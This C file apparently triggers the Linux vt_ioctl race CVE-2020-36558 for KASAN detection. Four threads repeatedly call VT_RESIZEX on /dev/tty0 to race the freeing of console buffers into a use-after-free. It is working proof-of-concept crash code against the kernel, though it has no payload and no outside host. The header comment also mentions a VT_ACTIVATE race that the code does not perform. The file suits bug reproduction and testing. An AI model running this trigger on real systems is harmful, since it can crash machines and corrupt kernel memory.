/*
 * CHAINFORGE KASAN crash-trigger for CVE-2020-36558 (CWE-362 race -> CWE-476/UAF, vt_ioctl).
 * vt: VT_RESIZEX ioctl races console teardown/resize; concurrent VT_RESIZEX + VT_ACTIVATE on
 * /dev/tty0 corrupts vc_data. Racing VT_RESIZEX from multiple threads reads/writes freed vc state.
 * NOT an exploit. KASAN in the vt/console path witnesses THIS CVE.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* vt ioctls */
#define VT_RESIZEX 0x560A
#define VT_ACTIVATE 0x5606
struct vt_consize {
    unsigned short v_rows, v_cols, v_vlin, v_clin, v_vcol, v_ccol;
};
static volatile int stop = 0;
static int tty_fd = -1;

/* Alternate BETWEEN threads on the SAME tty with DIFFERENT geometries each iteration, so every
 * VT_RESIZEX forces vc_do_resize -> krealloc of vc_data/screenbuf; concurrent resizes on the same
 * vc race the realloc/free of the old screenbuf. Vary sizes so the realloc path always runs. */
static void *resizer(void *arg) {
    long which = (long)arg;
    struct vt_consize cs;
    unsigned r = (unsigned)which * 7 + 10;
    while (!stop) {
        r = (r * 1103515245u + 12345u);
        memset(&cs, 0, sizeof cs);
        cs.v_rows = 10 + (r >> 8) % 120;     /* varying rows -> forces resize each time */
        cs.v_cols = 10 + (r >> 16) % 200;    /* varying cols */
        cs.v_vlin = cs.v_rows;
        cs.v_clin = cs.v_rows;
        cs.v_vcol = cs.v_cols;
        cs.v_ccol = cs.v_cols;
        ioctl(tty_fd, VT_RESIZEX, &cs);      /* concurrent resizes race vc_data realloc/free */
    }
    return NULL;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    tty_fd = open("/dev/tty0", O_RDWR);
    if (tty_fd < 0) tty_fd = open("/dev/console", O_RDWR);
    if (tty_fd < 0) { printf("[cf] no /dev/tty0 (need VT); abort\n"); return 0; }
    pthread_t t[4];
    for (long i = 0; i < 4; i++) pthread_create(&t[i], NULL, resizer, (void *)i);
    /* let the racing resizers run for a bounded time */
    for (int i = 0; i < 200; i++) {
        usleep(20000);
        if ((i & 31) == 0) printf("[cf] vt-resize racing %d/200\n", i);
    }
    stop = 1;
    for (int i = 0; i < 4; i++) pthread_join(t[i], NULL);
    printf("[cf] done (no KASAN splat this run)\n");
    return 0;
}
